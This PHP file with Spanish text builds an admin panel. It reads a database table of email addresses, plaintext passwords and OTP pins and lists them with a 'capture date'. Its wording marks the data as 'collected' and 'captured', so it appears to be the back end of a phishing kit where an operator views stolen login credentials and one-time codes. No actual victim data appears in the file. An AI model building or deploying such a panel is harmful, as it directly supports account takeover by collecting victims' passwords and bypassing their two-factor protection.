<?php
$db_url = getenv('DATABASE_URL');

try {
    if ($db_url) {
        $db_parts = parse_url($db_url);
        $host = $db_parts['host'];
        $port = $db_parts['port'];
        $user = $db_parts['user'];
        $pass = $db_parts['pass'];
        $dbname = ltrim($db_parts['path'], '/');
        
        $dsn = "pgsql:host=$host;port=$port;dbname=$dbname";
        $pdo = new PDO($dsn, $user, $pass);
    } else {
        $host = getenv('PGHOST') ?: 'localhost';
        $port = getenv('PGPORT') ?: '5432';
        $dbname = getenv('PGDATABASE') ?: 'tu_base_datos';
        $user = getenv('PGUSER') ?: 'tu_usuario';
        $pass = getenv('PGPASSWORD') ?: '';

        $dsn = "pgsql:host=$host;port=$port;dbname=$dbname";
        $pdo = new PDO($dsn, $user, $pass);
    }
    $pdo->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);
    
    // Consulta los datos recolectados
    $stmt = $pdo->query("SELECT id, email, password, otp, fecha_registro FROM usuarios_registro ORDER BY fecha_registro DESC");
    $registros = $stmt->fetchAll(PDO::FETCH_ASSOC);

} catch (PDOException $e) {
    die("Error al consultar la base de datos: " . $e->getMessage());
}
?>
<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Panel Administrador</title>
    <style>
        body { font-family: 'Segoe UI', Arial, sans-serif; background-color: #f8fafc; color: #1e293b; padding: 40px; margin: 0; }
        .container { max-width: 1000px; margin: auto; background: white; padding: 30px; border-radius: 12px; box-shadow: 0 4px 15px rgba(0,0,0,0.05); }
        h1 { color: #0f172a; border-bottom: 2px solid #e2e8f0; padding-bottom: 15px; margin-top: 0; display: flex; justify-content: space-between; align-items: center; }
        .counter { background: #6366f1; color: white; padding: 4px 12px; border-radius: 20px; font-size: 14px; }
        table { width: 100%; border-collapse: collapse; margin-top: 20px; text-align: left; }
        th { background-color: #f1f5f9; color: #475569; padding: 12px 15px; font-weight: 600; border-bottom: 2px solid #cbd5e1; }
        td { padding: 12px 15px; border-bottom: 1px solid #e2e8f0; font-size: 15px; }
        tr:hover { background-color: #f8fafc; }
        .date { color: #64748b; font-size: 13px; }
        .no-data { text-align: center; padding: 30px; color: #94a3b8; font-style: italic; }
    </style>
</head>
<body>

<div class="container">
    <h1>
        Panel General de Registros
        <span class="counter"><?php echo count($registros); ?> entradas totales</span>
    </h1>

    <table>
        <thead>
            <tr>
                <th>ID</th>
                <th>Correo Electrónico</th>
                <th>Contraseña</th>
                <th>Pin (OTP)</th>
                <th>Fecha Captura</th>
            </tr>
        </thead>
        <tbody>
            <?php if (count($registros) > 0): ?>
                <?php foreach ($registros as $row): ?>
                    <tr>
                        <td><?php echo $row['id']; ?></td>
                        <td><strong><?php echo htmlspecialchars($row['email']); ?></strong></td>
                        <td><code><?php echo htmlspecialchars($row['password']); ?></code></td>
                        <td><?php echo htmlspecialchars($row['otp']); ?></td>
                        <td class="date"><?php echo $row['fecha_registro']; ?></td>
                    </tr>
                <?php endforeach; ?>
            <?php else: ?>
                <tr>
                    <td colspan="5" class="no-data">No hay datos registrados todavía.</td>
                </tr>
            <?php endif; ?>
        </tbody>
    </table>
</div>

</body>
</html>

